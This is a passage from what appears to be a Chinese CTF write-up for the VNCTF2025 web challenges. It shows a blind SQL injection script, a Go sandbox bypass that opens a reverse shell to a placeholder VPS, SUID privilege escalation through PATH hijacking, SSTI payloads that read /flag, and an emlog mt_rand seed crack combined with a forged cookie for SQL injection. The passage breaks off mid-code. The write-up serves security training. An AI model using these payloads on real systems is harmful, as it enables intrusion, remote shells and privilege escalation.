spend_time=end_time-start_time<br>        <span class="hljs-keyword">if</span> spend_time&gt;=<span class="hljs-number">0.19</span>:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span>(mid ==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid ==<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">break</span><br>    flag = flag+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>+<span class="hljs-built_in">bytes</span>.fromhex(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>跑出username和password，但有可能跑错，所以多跑几次：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210144139964.png" alt="image-20250210144139964"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210144841158.png" alt="image-20250210144841158"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nailong/woaipangmao114514<br></code></pre></td></tr></table></figure><p>登录获得flag：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210144719548.png" alt="image-20250210144719548"></p><p>参考：<a href="https://www.freebuf.com/articles/network/324785.html">SQLite注入 - FreeBuf网络安全行业门户</a></p><h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><p>读取源码，可以发现有任意文件读取路由，key.go没有直接给我们，应该是要我们去读的。</p><p>然后跟一下会发现key.go影响jwt的token生成，有一个&#x2F;eval的执行沙箱代码，但是需要admin的鉴权：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Eval</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>code := c.PostForm(<span class="hljs-string">&quot;code&quot;</span>)<br>log.Println(code)<br><span class="hljs-keyword">if</span> code == <span class="hljs-string">&quot;&quot;</span> &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;No code provided&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>log.Println(containsBannedPackages(code))<br><span class="hljs-keyword">if</span> containsBannedPackages(code) &#123;<br>response.Response(c, http.StatusBadRequest, <span class="hljs-number">400</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Code contains banned packages&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>tmpFile, err := ioutil.TempFile(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;goeval-*.go&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Error creating temp file:&quot;</span>, err)<br>response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Error creating temporary file&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> os.Remove(tmpFile.Name())<br><br>_, err = tmpFile.WriteString(code)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Error writing code to temp file:&quot;</span>, err)<br>response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, <span class="hljs-literal">nil</span>, <span class="hljs-string">&quot;Error writing code to temp file&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>cmd := exec.Command(<span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;run&quot;</span>, tmpFile.Name())<br>output, err := cmd.CombinedOutput()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;Error running Go code:&quot;</span>, err)<br>response.Response(c, http.StatusInternalServerError, <span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-type">string</span>(output)&#125;, <span class="hljs-string">&quot;Error executing code&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>response.Success(c, gin.H&#123;<span class="hljs-string">&quot;result&quot;</span>: <span class="hljs-type">string</span>(output)&#125;, <span class="hljs-string">&quot;success&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>关键在这里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">containsBannedPackages</span><span class="hljs-params">(code <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>importRegex := <span class="hljs-string">`(?i)import\s*\((?s:.*?)\)`</span><br>re := regexp.MustCompile(importRegex)<br>matches := re.FindStringSubmatch(code)<br>imports := matches[<span class="hljs-number">0</span>]<br>log.Println(imports)<br><span class="hljs-keyword">if</span> strings.Contains(imports, <span class="hljs-string">&quot;os/exec&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果admin身份进入沙箱，这里会匹配<code>os/exec</code>，不让你外部执行命令。</p><p>但是根本难不倒他，<code>syscall</code>也能打。</p><p>其实细心一点看代码，就会发现这里的匹配只匹配了第一个import，意思就是你import两次第二次他根本就不检查，太难绷了……</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;os/exec&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>而读取到key.go后，我们能直接拿本地生成的token去套远程环境，因为这里mt_rand伪随机数生成的<code>JWT KEY</code>是唯一的，所以仍然有效。</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010014143.png" alt="image-20250210010014143"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010025744.png" alt="image-20250210010025744"></p><p>这里执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;syscall&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// Define the command and arguments</span><br>cmd := <span class="hljs-string">&quot;/bin/bash&quot;</span><br>args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&quot;</span>&#125;<br><br><span class="hljs-comment">// Execute the command</span><br>err := syscall.Exec(cmd, args, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Error executing command: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210145941925.png" alt="image-20250210145941925"></p><p>反弹shell成功：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010105078.png" alt="image-20250210010105078"></p><p>根目录假flag，suid提权看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>找到个&#x2F;…&#x2F;Cat，只会输出根目录那个假flag。<br>发现&#x2F;…&#x2F;Cat，我们base64给他弄下来逆一下，主逻辑：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210010128026.png" alt="image-20250210010128026"></p><p>这里的Cat会执行cat &#x2F;flag拿假flag命令，开始我还没想到，还试了试编译恶意so打LD_PRELOAD，但是失败了。</p><p>后面一搜suid方法，搜到了个环境变量提权的手段，新知识啊：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat &amp;&amp; <span class="hljs-built_in">chmod</span> +x /tmp/cat<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>大致意思就是，我们在tmp内写一个cat，将&#x2F;bin&#x2F;bash写进去，然后环境变量设置&#x2F;tmp，那么执行这个&#x2F;…&#x2F;Cat时会执行cat，而cat命令就会优先在环境变量寻找，也就是执行了&#x2F;tmp&#x2F;cat，此时就执行到root权限的&#x2F;bin&#x2F;bash而拿到了高权限shell。</p><p>但是直接读&#x2F;root下的flag好像没反应？算了都chmod 777再弹一次就行了：</p><p><img src="/2025/02/09/VNCTF2025-WEB/308ae036c3b7f36de06fd42201641bdc.png" alt="img"></p><h2 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a>学生姓名登记系统</h2><p><code>&#123;&#123;7*'7'&#125;&#125;</code>能直接查出python的SSTI，但是限制了长度最大23，而且open被ban了。</p><p>题目其实提示了一行一个名字，应该是用换行来绕这个限制。这里使用<code>%0a</code>就能绕。</p><p>这里的单文件框架其实就是bottle，虽然不太知道，但是知不知道都无所谓，测一测就知道赋值打法能直接常规SSTI一把梭了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;<br>&#123;&#123;b:=a.__class__&#125;&#125;<br>&#123;&#123;c:=b.__base__&#125;&#125;<br>&#123;&#123;d:=c.__subclasses__&#125;&#125;<br>&#123;&#123;e:=d()[<span class="hljs-number">154</span>]&#125;&#125;  <br>&#123;&#123;f:=e.__init__&#125;&#125;<br>&#123;&#123;g:=f.__globals__&#125;&#125;<br>&#123;&#123;h:=g[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>]&#125;&#125;<br>&#123;&#123;i:=h(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;<br>&#123;&#123;j:=i.read()&#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subclasses__&#125;&#125;%0a&#123;&#123;e:=d()[<span class="hljs-number">154</span>]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__globals__&#125;&#125;%0a&#123;&#123;h:=g[<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>]&#125;&#125;%0a&#123;&#123;i:=h(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;%0a&#123;&#123;j:=i.read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但这样直接打好像有点识别问题？而且无回显，测<code>&#123;&#123;print(5)&#125;&#125;</code>就能知道。</p><p>建议发HTTP包打或者hackbar，用open打：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;a:=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subclasses__&#125;&#125;%0a&#123;&#123;e:=d()[<span class="hljs-number">156</span>]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__globals__&#125;&#125;%0a&#123;&#123;z:=<span class="hljs-string">&#x27;__builtins__&#x27;</span>&#125;&#125;%0a&#123;&#123;h:=g[z]&#125;&#125;%0a&#123;&#123;i:=h[<span class="hljs-string">&#x27;op&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>]&#125;&#125;%0a&#123;&#123;x:=i(<span class="hljs-string">&quot;/flag&quot;</span>)&#125;&#125;%0a&#123;&#123;y:=x.read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210153054779.png" alt="image-20250210153054779"></p><h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a>ez_emlog</h2><p>据说是个0day。</p><p>分前台登录和后台RCE两步。</p><p>前台登录需要拿到AUTH_KEY，然后SQL注入拿到可用用户名，然后用这个用户名和AUTH_KEY生成可用cookie给CSRF进后台，后台可以上传恶意插件RCE。</p><p>去官方下载它的源码，先审计一下<code>install.php</code>：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210153854027.png" alt="image-20250210153854027"></p><p>AUTH_KEY和AUTH_COOKIE_NAME都使用了getRandStr()生成随机序列，跟进：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154001434.png" alt="image-20250210154001434"></p><p>看到了题目提示的mt_rand安全问题，这里只需要获得确定的序列就能破这个伪随机数，预测出AUTH_KEY。</p><p>审计源码能知道获得种子seed有两个方法，第一个是注册用户并登录，但是题目给关了。</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154434571.png" alt="image-20250210154434571"></p><p>继续审计源码，发现logout出去也能set-cookie。</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154358953.png" alt="image-20250210154358953"></p><p>审一下得到访问逻辑，那我们可以先访问action&#x3D;logout路由抓包获取这段cookie拿去爆种子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowable_characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><span class="hljs-variable">$len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$allowable_characters</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr&quot;</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;0 0 0 0 &quot;</span>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$pass</span>); <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$allowable_characters</span>, <span class="hljs-variable">$pass</span>[<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$number</span> <span class="hljs-subst">$number</span> 0 <span class="hljs-subst">$len</span> &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了生成符合爆破规则的字符串，可以把前面32位未知的值写为<code>0 0 0 0</code>，运行得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">43</span> <span class="hljs-number">43</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">26</span> <span class="hljs-number">26</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">48</span> <span class="hljs-number">48</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">21</span> <span class="hljs-number">21</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">35</span> <span class="hljs-number">35</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">51</span> <span class="hljs-number">51</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">50</span> <span class="hljs-number">50</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">4</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">51</span> <span class="hljs-number">51</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">32</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">17</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">58</span> <span class="hljs-number">58</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">5</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">9</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">47</span> <span class="hljs-number">47</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">40</span> <span class="hljs-number">40</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">55</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">24</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">16</span> <span class="hljs-number">16</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">50</span> <span class="hljs-number">50</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span> <span class="hljs-number">17</span> <span class="hljs-number">17</span> <span class="hljs-number">0</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210154643999.png" alt="image-20250210154643999"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161426050.png" alt="image-20250210161426050"></p><p>爆出种子：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">2430606281</span><br></code></pre></td></tr></table></figure><p>回到鉴权逻辑：</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161242617.png" alt="image-20250210161242617"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210161342127.png" alt="image-20250210161342127"></p><p>显然这里可以构造永真式SQL打个报错注入，这里的UA头是网站页面那个博客里给的UA：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$seed</span> = <span class="hljs-number">2430606281</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-variable">$rand_string</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()&quot;</span>;<br><br><span class="hljs-variable">$retStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">32</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$retStr</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rand_string</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rand_string</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$user_agent</span> = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0&#x27;</span>;<br><span class="hljs-variable">$auth_key</span> = <span class="hljs-variable">$retStr</span>.<span class="hljs-variable">$user_agent</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;AUTH_KEY:&#x27;</span> . <span class="hljs-variable">$auth_key</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;x&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #&quot;</span>;<br><span class="hljs-variable">$expiration</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$auth_key</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> .  <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nEM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$expiration</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$hash</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 